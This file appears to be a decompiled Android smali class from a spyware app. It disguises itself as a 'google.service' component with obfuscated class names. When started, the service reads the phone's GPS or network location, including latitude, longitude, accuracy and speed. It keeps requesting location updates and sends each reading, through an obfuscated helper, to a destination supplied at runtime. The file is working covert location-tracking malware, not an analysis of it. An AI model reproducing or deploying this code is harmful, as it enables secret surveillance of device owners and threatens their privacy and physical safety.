.class public Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;
.super Landroid/app/Service;
.source "\u02c8\u02be\u2db1\u2db1\u2db1\u0cf2\u1d54\u02ce\u02c6\u3164$\u02ce\u1d47\u02c9\u4240\u02ce$\u02cb\u02cb\u02cf$\u02c9\u3164\u4240\u1d35\u3164\u1d62\u02be\u2071$\u02be\u02be$\u31644776.java"


# static fields
.field public static $䉀ʾᵢⶱ:F = 0.0f

.field public static LL:Landroid/location/LocationListener; = null

.field public static LM:Landroid/location/LocationManager; = null

.field public static d:J = 0x0L

.field public static sp:F = 0.0f

.field static st:Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776; = null

.field public static t:J = 0x1388L

.field public static ʾʼʾʿˈᵔঙʿ$ʿʼ:D

.field public static φˎ$ˉˎ$ﹳˊⶱⁱᵇʾ䉀:D


# instance fields
.field private vul:[Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 25
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$000(Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;DDF)V
    .locals 0

    .line 25
    invoke-direct/range {p0 .. p5}, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->s(DDF)V

    return-void
.end method

.method private p()V
    .locals 2

    .line 185
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 186
    invoke-virtual {p0, v0}, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method private ru()V
    .locals 13

    const-string v0, "gps"

    const-string v1, "network"

    :try_start_0
    const-string v2, "location"

    .line 110
    invoke-virtual {p0, v2}, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/location/LocationManager;

    sput-object v2, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LM:Landroid/location/LocationManager;

    .line 111
    new-instance v2, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776$1;

    invoke-direct {v2, p0}, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776$1;-><init>(Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;)V

    sput-object v2, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LL:Landroid/location/LocationListener;

    .line 146
    sget-object v2, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LM:Landroid/location/LocationManager;

    invoke-virtual {v2, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v2

    .line 147
    sget-object v3, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LM:Landroid/location/LocationManager;

    invoke-virtual {v3, v0}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_0

    if-nez v2, :cond_0

    .line 149
    invoke-direct {p0}, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->p()V

    goto/16 :goto_0

    :cond_0
    if-eqz v2, :cond_2

    .line 152
    sget-object v0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LM:Landroid/location/LocationManager;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    if-eqz v0, :cond_1

    .line 154
    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v1

    sput-wide v1, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->φˎ$ˉˎ$ﹳˊⶱⁱᵇʾ䉀:D

    .line 155
    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v1

    sput-wide v1, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    .line 156
    invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F

    move-result v1

    sput v1, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->$䉀ʾᵢⶱ:F

    .line 157
    invoke-virtual {v0}, Landroid/location/Location;->getSpeed()F

    move-result v0

    sput v0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->sp:F

    .line 158
    sget-wide v2, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    sget-wide v4, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->φˎ$ˉˎ$ﹳˊⶱⁱᵇʾ䉀:D

    sget v6, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->$䉀ʾᵢⶱ:F

    move-object v1, p0

    invoke-direct/range {v1 .. v6}, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->s(DDF)V

    .line 160
    :cond_1
    sget-object v7, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LM:Landroid/location/LocationManager;

    const-string v8, "network"

    sget-wide v9, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->t:J

    sget-wide v0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->d:J

    long-to-float v11, v0

    sget-object v12, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LL:Landroid/location/LocationListener;

    invoke-virtual/range {v7 .. v12}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    goto :goto_0

    :cond_2
    if-eqz v3, :cond_4

    .line 162
    sget-object v1, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LM:Landroid/location/LocationManager;

    invoke-virtual {v1, v0}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    if-eqz v0, :cond_3

    .line 164
    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v1

    sput-wide v1, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->φˎ$ˉˎ$ﹳˊⶱⁱᵇʾ䉀:D

    .line 165
    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v1

    sput-wide v1, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    .line 166
    invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F

    move-result v1

    sput v1, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->$䉀ʾᵢⶱ:F

    .line 167
    invoke-virtual {v0}, Landroid/location/Location;->getSpeed()F

    move-result v0

    sput v0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->sp:F

    .line 168
    sget-wide v2, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    sget-wide v4, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->φˎ$ˉˎ$ﹳˊⶱⁱᵇʾ䉀:D

    sget v6, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->$䉀ʾᵢⶱ:F

    move-object v1, p0

    invoke-direct/range {v1 .. v6}, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->s(DDF)V

    .line 170
    :cond_3
    sget-object v7, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LM:Landroid/location/LocationManager;

    const-string v8, "gps"

    sget-wide v9, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->t:J

    sget-wide v0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->d:J

    long-to-float v11, v0

    sget-object v12, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LL:Landroid/location/LocationListener;

    invoke-virtual/range {v7 .. v12}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-wide/16 v0, 0x0

    .line 174
    sput-wide v0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->φˎ$ˉˎ$ﹳˊⶱⁱᵇʾ䉀:D

    .line 175
    sput-wide v0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    .line 176
    invoke-direct {p0}, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->p()V

    :cond_4
    :goto_0
    return-void
.end method

.method private s(DDF)V
    .locals 2

    .line 180
    sget v0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->sp:F

    float-to-int v0, v0

    .line 181
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, p1, p2}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    iget-object p1, p0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->vul:[Ljava/lang/String;

    const/4 p2, 0x0

    aget-object p1, p1, p2

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p3, p4}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    iget-object p1, p0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->vul:[Ljava/lang/String;

    aget-object p1, p1, p2

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p5}, Ljava/lang/StringBuilder;->append(F)Ljava/lang/StringBuilder;

    iget-object p1, p0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->vul:[Ljava/lang/String;

    aget-object p1, p1, p2

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 182
    iget-object p2, p0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->vul:[Ljava/lang/String;

    const/4 p3, 0x1

    aget-object p2, p2, p3

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {p2, p1}, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->AumeVodcmCGNSRurHjuj4816(Ljava/lang/String;[B)V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 2

    const/4 v0, 0x0

    .line 190
    sput v0, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->sf2:I

    const/4 v0, 0x0

    .line 191
    sput-object v0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->st:Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;

    .line 194
    :try_start_0
    sget-object v0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LM:Landroid/location/LocationManager;

    sget-object v1, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->LL:Landroid/location/LocationListener;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 196
    :catch_0
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    .line 39
    sget-object p2, Lgoogle/service/䉀ㅤ$ʾᴵⶱՙˎʾθʿ䉀φיʼʿʾ䉀ᵢᴵ䉀ﹶʾ₫ˎﹶⶱˋᴵᘣᵎ$4778;->FTX2:Ljava/lang/String;

    if-eqz p1, :cond_0

    .line 41
    invoke-virtual {p1, p2}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result p3

    if-eqz p3, :cond_0

    .line 43
    invoke-virtual {p0}, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->getApplicationContext()Landroid/content/Context;

    move-result-object p3

    .line 44
    invoke-virtual {p3}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p3

    const v0, 0x7f090010

    invoke-virtual {p3, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p3

    sput-object p3, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->pr:Ljava/lang/String;

    .line 95
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->vul:[Ljava/lang/String;

    .line 96
    invoke-direct {p0}, Lgoogle/service/ˈʾⶱⶱⶱೲᵔˎˆㅤ$ˎᵇˉ䉀ˎ$ˋˋˏ$ˉㅤ䉀ᴵㅤᵢʾⁱ$ʾʾ$ㅤ4776;->ru()V

    :cond_0
    const/4 p1, 0x1

    return p1
.end method
